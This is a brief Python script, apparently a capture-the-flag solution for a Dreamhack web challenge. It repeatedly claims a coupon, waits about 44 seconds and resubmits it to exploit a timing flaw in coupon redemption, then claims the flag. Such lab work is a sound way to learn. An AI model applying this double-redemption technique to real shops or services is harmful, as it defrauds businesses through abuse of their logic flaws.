
from time import sleep
import requests

URL="http://host3.dreamhack.games:11551/"

resp2Text='error'

s = requests.Session()
while resp2Text=='error':
    if s.headers.get('Authorization',None)!=None:
        s.headers.pop('Authorization')
    session_key=requests.get(URL+"/session").json()["session"]
    s.headers['Authorization']=session_key
    print(session_key)
    resp=s.get(URL+'/me')
    coupon=s.get(URL+'/coupon/claim').json()['coupon']
    s.headers['coupon']=coupon
    resp2=s.get(URL+"/coupon/submit")
    print(resp2.text)
    sleep(44.1)
    resp2Text=s.get(URL+"/coupon/submit").json()['status']
    print(resp2Text)


print(s.get(URL+'/flag/claim').text)



final_resp=s.get(URL+'/me')

print(final_resp.text)



